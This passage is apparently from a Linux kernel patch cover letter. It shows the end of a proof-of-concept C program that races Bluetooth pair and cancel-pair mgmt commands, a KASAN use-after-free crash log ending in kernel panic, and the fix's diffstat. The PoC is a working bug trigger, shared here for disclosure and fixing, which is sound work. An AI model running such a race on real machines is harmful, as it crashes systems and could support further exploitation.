	if (mgmt_send_sync(MGMT_OP_SET_BONDABLE, controller_index,
			   &bondable, sizeof(bondable), &status) == 0)
		info("bondable status=0x%02x", status);

	info("starting pair/cancel race for %d iterations", ITERATIONS);

	for (i = 1; i <= ITERATIONS && keep_running; i++) {
		unsigned long gen;

		pthread_mutex_lock(&state_lock);
		current_generation++;
		gen = current_generation;
		injection_scheduled = false;
		pthread_mutex_unlock(&state_lock);

		pthread_mutex_lock(&mgmt_lock);
		if (start_pairing() < 0) {
			pthread_mutex_unlock(&mgmt_lock);
			die("pair write failed: %s", strerror(errno));
		}
		pthread_mutex_unlock(&mgmt_lock);

		if (!wait_for_smp_request(gen))
			continue;

		send_cancel_pair();

		usleep(5000);

		if ((i % 100) == 0)
			info("completed %d iterations", i);
	}

	keep_running = 0;
	pthread_kill(vhci_tid, SIGINT);
	pthread_join(vhci_tid, NULL);
	return 0;
}

------END poc.c--------

----BEGIN crash log----

[  355.420452] [   T5086] BUG: KASAN: slab-use-after-free in mgmt_pending_remove+0x168/0x1c0
[  355.420530] [   T5086] Read of size 8 at addr ff11000070bc9438 by task kworker/u17:1/5086

[  355.420556] [   T5086] CPU: 1 UID: 0 PID: 5086 Comm: kworker/u17:1 Not tainted 7.0.0-08308-g9e1e9d660255 #1 PREEMPT(full)
[  355.420567] [   T5086] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  355.420574] [   T5086] Workqueue: hci0 hci_rx_work
[  355.420589] [   T5086] Call Trace:
[  355.420599] [   T5086]  <TASK>
[  355.420607] [   T5086]  dump_stack_lvl+0x78/0xe0
[  355.420641] [   T5086]  print_report+0xf7/0x600
[  355.420672] [   T5086]  ? mgmt_pending_remove+0x168/0x1c0
[  355.420682] [   T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.420698] [   T5086]  ? __virt_addr_valid+0x231/0x420
[  355.420722] [   T5086]  ? mgmt_pending_remove+0x168/0x1c0
[  355.420733] [   T5086]  kasan_report+0xe4/0x120
[  355.420751] [   T5086]  ? mgmt_pending_remove+0x168/0x1c0
[  355.420777] [   T5086]  mgmt_pending_remove+0x168/0x1c0
[  355.420794] [   T5086]  mgmt_auth_failed+0x2bf/0x3f0
[  355.420805] [   T5086]  ? find_held_lock+0x2b/0x80
[  355.420826] [   T5086]  ? __pfx_mgmt_auth_failed+0x10/0x10
[  355.420841] [   T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.420849] [   T5086]  ? __lock_acquire+0x45c/0x25f0
[  355.420870] [   T5086]  smp_recv_cb+0x5a3/0x9330
[  355.420890] [   T5086]  ? srso_alias_safe_ret+0x1/0x7
[  355.420912] [   T5086]  ? __pfx_smp_recv_cb+0x10/0x10
[  355.420924] [   T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.420932] [   T5086]  ? rcu_is_watching+0x12/0xc0
[  355.420950] [   T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.420958] [   T5086]  ? trace_contention_end+0x122/0x170
[  355.420973] [   T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.420981] [   T5086]  ? __mutex_lock+0x26f/0x1ad0
[  355.420999] [   T5086]  ? l2cap_get_chan_by_scid+0x109/0x170
[  355.421009] [   T5086]  ? stack_trace_save+0x93/0xd0
[  355.421020] [   T5086]  ? __pfx_stack_trace_save+0x10/0x10
[  355.421037] [   T5086]  ? __pfx___mutex_lock+0x10/0x10
[  355.421048] [   T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.421057] [   T5086]  ? find_held_lock+0x2b/0x80
[  355.421085] [   T5086]  ? __pfx_l2cap_chan_hold_unless_zero+0x10/0x10
[  355.421116] [   T5086]  ? l2cap_recv_frame+0x1397/0x9b70
[  355.421126] [   T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.421134] [   T5086]  l2cap_recv_frame+0x1397/0x9b70
[  355.421154] [   T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.421163] [   T5086]  ? lock_acquire+0x1ab/0x360
[  355.421175] [   T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.421201] [   T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.421213] [   T5086]  ? __pfx_l2cap_recv_frame+0x10/0x10
[  355.421223] [   T5086]  ? trace_contention_end+0x122/0x170
[  355.421238] [   T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.421246] [   T5086]  ? __mutex_lock+0x26f/0x1ad0
[  355.421258] [   T5086]  ? l2cap_recv_acldata+0x186/0xe40
[  355.421269] [   T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.421290] [   T5086]  ? __pfx___mutex_lock+0x10/0x10
[  355.421299] [   T5086]  ? __mutex_unlock_slowpath+0x162/0x8b0
[  355.421308] [   T5086]  ? do_raw_spin_lock+0x83/0x270
[  355.421319] [   T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.421328] [   T5086]  ? find_held_lock+0x2b/0x80
[  355.421341] [   T5086]  ? __pfx___mutex_unlock_slowpath+0x10/0x10
[  355.421360] [   T5086]  ? __pfx_l2cap_conn_hold_unless_zero+0x10/0x10
[  355.421374] [   T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.421395] [   T5086]  l2cap_recv_acldata+0xbcb/0xe40
[  355.421408] [   T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.421425] [   T5086]  hci_rx_work+0x464/0xd10
[  355.421448] [   T5086]  process_one_work+0x8dc/0x1be0
[  355.421491] [   T5086]  ? __pfx_process_one_work+0x10/0x10
[  355.421500] [   T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.421526] [   T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.421581] [   T5086]  worker_thread+0x52d/0xec0
[  355.421618] [   T5086]  ? __pfx_worker_thread+0x10/0x10
[  355.421628] [   T5086]  kthread+0x312/0x410
[  355.421642] [   T5086]  ? _raw_spin_unlock_irq+0x28/0x50
[  355.421651] [   T5086]  ? __pfx_kthread+0x10/0x10
[  355.421665] [   T5086]  ret_from_fork+0x600/0xa20
[  355.421685] [   T5086]  ? __pfx_ret_from_fork+0x10/0x10
[  355.421702] [   T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.421710] [   T5086]  ? __switch_to+0x57f/0xe20
[  355.421728] [   T5086]  ? __pfx_kthread+0x10/0x10
[  355.421742] [   T5086]  ret_from_fork_asm+0x1a/0x30
[  355.421787] [   T5086]  </TASK>

[  355.421925] [   T5086] Allocated by task 10508:
[  355.421944] [   T5086]  kasan_save_stack+0x33/0x60
[  355.421958] [   T5086]  kasan_save_track+0x14/0x30
[  355.421970] [   T5086]  __kasan_kmalloc+0xaa/0xb0
[  355.421982] [   T5086]  mgmt_pending_new+0x5b/0x200
[  355.421995] [   T5086]  mgmt_pending_add+0x22/0x150
[  355.422008] [   T5086]  pair_device+0x5c5/0xeb0
[  355.422022] [   T5086]  hci_sock_sendmsg+0x1440/0x22f0
[  355.422036] [   T5086]  sock_write_iter+0x420/0x4b0
[  355.422065] [   T5086]  vfs_write+0xa63/0xfb0
[  355.422083] [   T5086]  ksys_write+0x181/0x1d0
[  355.422096] [   T5086]  do_syscall_64+0x116/0xf80
[  355.422110] [   T5086]  entry_SYSCALL_64_after_hwframe+0x77/0x7f

[  355.422129] [   T5086] Freed by task 10508:
[  355.422139] [   T5086]  kasan_save_stack+0x33/0x60
[  355.422151] [   T5086]  kasan_save_track+0x14/0x30
[  355.422163] [   T5086]  kasan_save_free_info+0x3b/0x60
[  355.422177] [   T5086]  __kasan_slab_free+0x5f/0x80
[  355.422198] [   T5086]  kfree+0x2e8/0x6c0
[  355.422214] [   T5086]  cancel_pair_device+0x242/0x390
[  355.422228] [   T5086]  hci_sock_sendmsg+0x1440/0x22f0
[  355.422241] [   T5086]  sock_write_iter+0x420/0x4b0
[  355.422252] [   T5086]  vfs_write+0xa63/0xfb0
[  355.422265] [   T5086]  ksys_write+0x181/0x1d0
[  355.422277] [   T5086]  do_syscall_64+0x116/0xf80
[  355.422290] [   T5086]  entry_SYSCALL_64_after_hwframe+0x77/0x7f

[  355.422309] [   T5086] The buggy address belongs to the object at ff11000070bc9420
                           which belongs to the cache kmalloc-96 of size 96
[  355.422321] [   T5086] The buggy address is located 24 bytes inside of
                           freed 96-byte region [ff11000070bc9420, ff11000070bc9480)

[  355.422342] [   T5086] The buggy address belongs to the physical page:
[  355.422351] [   T5086] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x70bc9
[  355.422365] [   T5086] flags: 0xfff00000000000(node=0|zone=1|lastcpupid=0x7ff)
[  355.422378] [   T5086] page_type: f5(slab)
[  355.422392] [   T5086] raw: 00fff00000000000 ff1100010003c340 ffd40000044f4310 ff11000100032328
[  355.422404] [   T5086] raw: 0000000000000000 0000000800100010 00000000f5000000 0000000000000000
[  355.422413] [   T5086] page dumped because: kasan: bad access detected
[  355.422423] [   T5086] page_owner tracks the page as allocated
[  355.423281] [   T5086] page last allocated via order 0, migratetype Unmovable, gfp_mask 0x52cc0(GFP_KERNEL|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP), pid 5162, tgid 5162 (systemd-udevd), ts 147912085835, free_ts 147883166310
[  355.425726] [   T5086]  post_alloc_hook+0x126/0x150
[  355.425747] [   T5086]  get_page_from_freelist+0x768/0x32b0
[  355.425758] [   T5086]  __alloc_frozen_pages_noprof+0x27b/0x2af0
[  355.425769] [   T5086]  alloc_pages_mpol+0x14a/0x440
[  355.425932][ T5086] page last free pid 24 tgid 24 stack trace:
[  355.427096][ T5086] kernel BUG at lib/list_debug.c:56!
[  355.427859][ T5086] Oops: invalid opcode: 0000 [#1] SMP KASAN NOPTI
[  355.428674][ T5086] CPU: 1 UID: 0 PID: 5086 Comm: kworker/u17:1 Tainted: G    B               7.0.0-08308-g9e1e9d660255 #1 PREEMPT(full)
[  355.430253][ T5086] Tainted: [B]=BAD_PAGE
[  355.430780][ T5086] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  355.432130][ T5086] Workqueue: hci0 hci_rx_work
[  355.432739][ T5086] RIP: 0010:__list_del_entry_valid_or_report+0x121/0x200
[  355.433643][ T5086] Code: 48 c7 c7 40 9a 0e 8b e8 9d 82 2d fd 90 0f 0b 4c 89 e7 e8 d2 34 95 fd 4c 89 e2 48 89 de 48 c7 c7 a0 9a 0e 8b e8 80 82 2d fd 90 <0f> 0b 48 89 ef e8 b5 34 95 fd 48 89 ea 48 89 de 48 c7 c7 00 9b 0e
[  355.436073][ T5086] RSP: 0018:ffa0000012e77580 EFLAGS: 00010246
[  355.436846][ T5086] RAX: 000000000000004e RBX: ff11000070bc9420 RCX: 0000000000000000
[  355.437843][ T5086] RDX: 0000000000000000 RSI: 0000000000000004 RDI: 0000000000000001
[  355.438676][ T5086] RBP: dead000000000122 R08: 0000000000000001 R09: ffe21c0022f94901
[  355.439520][ T5086] R10: ff11000117ca480b R11: ffa0000012e77308 R12: dead000000000100
[  355.440356][ T5086] R13: 1ff40000025ceebb R14: 0000000000000005 R15: ff11000111b651e8
[  355.441181][ T5086] FS:  0000000000000000(0000) GS:ff11000184ae8000(0000) knlGS:0000000000000000
[  355.442126][ T5086] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  355.442879][ T5086] CR2: 00007f25b5201ed8 CR3: 0000000071e09000 CR4: 0000000000751ef0
[  355.443721][ T5086] PKRU: 55555554
[  355.444098][ T5086] Call Trace:
[  355.444460][ T5086]  <TASK>
[  355.444780][ T5086]  mgmt_pending_remove+0x51/0x1c0
[  355.445331][ T5086]  mgmt_auth_failed+0x2bf/0x3f0
[  355.445844][ T5086]  ? find_held_lock+0x2b/0x80
[  355.446355][ T5086]  ? __pfx_mgmt_auth_failed+0x10/0x10
[  355.446925][ T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.447523][ T5086]  ? __lock_acquire+0x45c/0x25f0
[  355.448061][ T5086]  smp_recv_cb+0x5a3/0x9330
[  355.448557][ T5086]  ? srso_alias_safe_ret+0x1/0x7
[  355.449084][ T5086]  ? __pfx_smp_recv_cb+0x10/0x10
[  355.449624][ T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.450222][ T5086]  ? rcu_is_watching+0x12/0xc0
[  355.450727][ T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.451321][ T5086]  ? trace_contention_end+0x122/0x170
[  355.451891][ T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.452489][ T5086]  ? __mutex_lock+0x26f/0x1ad0
[  355.453001][ T5086]  ? l2cap_get_chan_by_scid+0x109/0x170
[  355.453593][ T5086]  ? stack_trace_save+0x93/0xd0
[  355.454106][ T5086]  ? __pfx_stack_trace_save+0x10/0x10
[  355.454685][ T5086]  ? __pfx___mutex_lock+0x10/0x10
[  355.455235][ T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.455827][ T5086]  ? find_held_lock+0x2b/0x80
[  355.456153][ T5086]  ? __pfx_l2cap_chan_hold_unless_zero+0x10/0x10
[  355.456575][ T5086]  ? l2cap_recv_frame+0x1397/0x9b70
[  355.456907][ T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.457273][ T5086]  l2cap_recv_frame+0x1397/0x9b70
[  355.457601][ T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.457968][ T5086]  ? lock_acquire+0x1ab/0x360
[  355.458281][ T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.458647][ T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.459010][ T5086]  ? __pfx_l2cap_recv_frame+0x10/0x10
[  355.459364][ T5086]  ? trace_contention_end+0x122/0x170
[  355.459718][ T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.460086][ T5086]  ? __mutex_lock+0x26f/0x1ad0
[  355.460401][ T5086]  ? l2cap_recv_acldata+0x186/0xe40
[  355.460728][ T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.461092][ T5086]  ? __pfx___mutex_lock+0x10/0x10
[  355.461422][ T5086]  ? __mutex_unlock_slowpath+0x162/0x8b0
[  355.461781][ T5086]  ? do_raw_spin_lock+0x83/0x270
[  355.462096][ T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.462464][ T5086]  ? find_held_lock+0x2b/0x80
[  355.462769][ T5086]  ? __pfx___mutex_unlock_slowpath+0x10/0x10
[  355.463160][ T5086]  ? __pfx_l2cap_conn_hold_unless_zero+0x10/0x10
[  355.463579][ T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.463948][ T5086]  l2cap_recv_acldata+0xbcb/0xe40
[  355.464279][ T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.464648][ T5086]  hci_rx_work+0x464/0xd10
[  355.464942][ T5086]  process_one_work+0x8dc/0x1be0
[  355.465287][ T5086]  ? __pfx_process_one_work+0x10/0x10
[  355.465944][ T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.466321][ T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.466689][ T5086]  worker_thread+0x52d/0xec0
[  355.467004][ T5086]  ? __pfx_worker_thread+0x10/0x10
[  355.467345][ T5086]  kthread+0x312/0x410
[  355.467610][ T5086]  ? _raw_spin_unlock_irq+0x28/0x50
[  355.467945][ T5086]  ? __pfx_kthread+0x10/0x10
[  355.468248][ T5086]  ret_from_fork+0x600/0xa20
[  355.468538][ T5086]  ? __pfx_ret_from_fork+0x10/0x10
[  355.468864][ T5086]  ? srso_alias_return_thunk+0x5/0xfbef5
[  355.469235][ T5086]  ? __switch_to+0x57f/0xe20
[  355.469538][ T5086]  ? __pfx_kthread+0x10/0x10
[  355.469834][ T5086]  ret_from_fork_asm+0x1a/0x30
[  355.470151][ T5086]  </TASK>
[  355.470365][ T5086] Modules linked in:
[  355.470853][ T5086] ---[ end trace 0000000000000000 ]---
[  355.471273][ T5086] RIP: 0010:__list_del_entry_valid_or_report+0x121/0x200
[  355.471731][ T5086] Code: 48 c7 c7 40 9a 0e 8b e8 9d 82 2d fd 90 0f 0b 4c 89 e7 e8 d2 34 95 fd 4c 89 e2 48 89 de 48 c7 c7 a0 9a 0e 8b e8 80 82 2d fd 90 <0f> 0b 48 89 ef e8 b5 34 95 fd 48 89 ea 48 89 de 48 c7 c7 00 9b 0e
[  355.473005][ T5086] RSP: 0018:ffa0000012e77580 EFLAGS: 00010246
[  355.473420][ T5086] RAX: 000000000000004e RBX: ff11000070bc9420 RCX: 0000000000000000
[  355.473954][ T5086] RDX: 0000000000000000 RSI: 0000000000000004 RDI: 0000000000000001
[  355.474478][ T5086] RBP: dead000000000122 R08: 0000000000000001 R09: ffe21c0022f94901
[  355.474995][ T5086] R10: ff11000117ca480b R11: ffa0000012e77308 R12: dead000000000100
[  355.475523][ T5086] R13: 1ff40000025ceebb R14: 0000000000000005 R15: ff11000111b651e8
[  355.476065][ T5086] FS:  0000000000000000(0000) GS:ff11000184ae8000(0000) knlGS:0000000000000000
[  355.476648][ T5086] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  355.478322][ T5086] CR2: 00007f25b5201ed8 CR3: 0000000071e09000 CR4: 0000000000751ef0
[  355.478838][ T5086] PKRU: 55555554
[  355.479074][ T5086] Kernel panic - not syncing: Fatal exception
[  355.479789][ T5086] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  Bluetooth: mgmt: fix UAF in pair command cancellation

 net/bluetooth/mgmt.c | 64 +++++++++++++++++++++++++++++++-------------
 1 file changed, 46 insertions(+), 18 deletions(-)

-- 
2.43.0

